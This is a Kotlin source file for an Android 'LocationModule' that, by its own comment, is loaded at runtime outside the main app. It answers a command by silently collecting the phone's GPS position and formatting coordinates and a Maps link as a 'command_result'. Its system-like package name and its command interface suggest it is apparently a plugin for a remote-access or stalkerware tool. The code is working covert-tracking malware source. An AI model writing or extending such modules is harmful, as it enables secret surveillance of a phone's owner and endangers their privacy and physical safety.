package com.android.modules

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationListener
import android.location.LocationManager
import android.os.HandlerThread
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/** LocationModule — dynamically loaded, NOT compiled into main APK */
class LocationModule {
    @SuppressLint("MissingPermission")
    fun execute(ctx: Context, command: String, extra: String?): Pair<String, String> =
        Pair(getLocation(ctx), "command_result")

    @SuppressLint("MissingPermission")
    private fun getLocation(ctx: Context): String {
        return try {
            val lm        = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = lm.getProviders(true)
            if (providers.isEmpty()) return "⚠️ No location providers. Enable GPS."
            val latch   = CountDownLatch(1)
            var fresh: android.location.Location? = null
            val ht      = HandlerThread("loc-fix").also { it.start() }
            val listener = LocationListener { loc ->
                if (fresh == null || loc.accuracy < (fresh?.accuracy ?: Float.MAX_VALUE)) fresh = loc
                latch.countDown()
            }
            for (p in providers) try { lm.requestLocationUpdates(p, 0L, 0f, listener, ht.looper) } catch (_: Exception) {}
            latch.await(12, TimeUnit.SECONDS)
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
            ht.quitSafely()
            var best = fresh
            if (best == null) for (p in providers) {
                val loc = try { lm.getLastKnownLocation(p) } catch (_: Exception) { null } ?: continue
                if (best == null || loc.accuracy < best.accuracy) best = loc
            }
            if (best != null) {
                val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                buildString {
                    appendLine("📍 Location")
                    appendLine("Latitude:  ${best.latitude}")
                    appendLine("Longitude: ${best.longitude}")
                    appendLine("Accuracy:  ${best.accuracy}m")
                    appendLine("Provider:  ${best.provider}")
                    appendLine("Time:      ${fmt.format(Date(best.time))}")
                    appendLine("Fresh:     ${if (fresh != null) "yes" else "no (cached)"}")
                    appendLine("Maps: https://maps.google.com/?q=${best.latitude},${best.longitude}")
                }
            } else "⚠️ Location not available."
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
